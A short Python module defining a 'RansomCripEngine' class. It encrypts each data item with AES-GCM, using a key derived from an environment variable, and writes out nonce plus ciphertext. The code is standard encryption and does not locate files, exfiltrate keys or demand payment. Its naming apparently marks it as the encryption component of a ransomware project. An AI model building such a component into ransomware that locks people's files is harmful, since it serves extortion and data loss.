import os
import json
import hashlib
from typing import Any, Callable

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from domain.service.IRansomCripEngine import IRansomCripEngine


_NONCE_LEN = 12
_TAG_LEN   = 16


class RansomCripEngine(IRansomCripEngine):

    def __init__(self) -> None:
        key_str = os.getenv("KEY_CRIP_DATA", "")
        if not key_str:
            raise EnvironmentError("KEY_CRIP_DATA não configurada no ambiente")

        key_bytes = hashlib.sha256(key_str.encode("utf-8")).digest()
        self._aesgcm = AESGCM(key_bytes)

    def execute(self, write: Callable[[bytes], None], datas: list) -> None:
        for data in datas:
            plaintext = self._to_bytes(data)

            nonce = os.urandom(_NONCE_LEN)
            ciphertext_and_tag = self._aesgcm.encrypt(nonce, plaintext, None)
            write(nonce + ciphertext_and_tag)

    def _to_bytes(self, data: Any) -> bytes:
        if isinstance(data, bytes):
            return data
        if isinstance(data, str):
            return data.encode("utf-8")
        return json.dumps(data, ensure_ascii=False, separators=(",", ":"),
                          default=str).encode("utf-8")
